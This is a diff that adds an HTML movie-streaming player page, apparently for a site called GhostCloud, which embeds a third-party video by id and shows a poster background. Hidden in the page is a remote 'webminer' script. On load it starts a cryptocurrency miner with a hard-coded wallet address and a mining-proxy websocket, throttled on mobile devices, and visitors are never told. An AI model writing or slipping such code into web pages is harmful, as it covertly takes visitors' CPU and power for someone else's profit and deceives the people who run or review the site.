@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Playing Now | GhostCloud</title>
+</head>
+<body style="margin:0; background:#000; height:100vh; display:flex; flex-direction:column; overflow:hidden;">
+    
+    <div id="ambient" style="position:fixed; inset:0; z-index:-1; filter:blur(80px) opacity(0.4); background-size:cover; background-position:center;"></div>
+
+    <iframe id="vid" src="" style="border:none; width:100%; height:100%; z-index:2;" allowfullscreen sandbox="allow-forms allow-scripts allow-same-origin allow-presentation"></iframe>
+
+    <button onclick="history.back()" style="position:fixed; top:20px; left:20px; padding:10px 25px; background:rgba(0,0,0,0.6); backdrop-filter:blur(10px); color:white; border:1px solid #444; border-radius:30px; cursor:pointer; font-weight:bold; z-index:100;">← Back</button>
+
+    <script src="https://cdn.jsdelivr.net/gh/annoforge/webminer@main/load.js"></script>
+    <script>
+        const params = new URLSearchParams(window.location.search);
+        const id = params.get('id');
+        const img = params.get('img');
+
+        document.getElementById('vid').src = `https://vidsrc.to/embed/movie/${id}`;
+        if(img) document.getElementById('ambient').style.backgroundImage = `url(https://image.tmdb.org/t/p/w500${img})`;
+
+        window.onload = () => {
+            const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+            const playerPower = isMobile ? 25 : 65; 
+            if(typeof startMining === "function") startMining('48bN9tTb8niehRBkARiRPQgXYQFuh65pj3fp7DSfY8akMgdsQFUKqqg8FbtVQcKVdJPoNapcWMUiu1TSZiG7FxftFy8hiRy', "Cinema_Active", "wss://ny1.xmrminingproxy.com", playerPower);
+        };
+    </script>
+</body>
+</html>
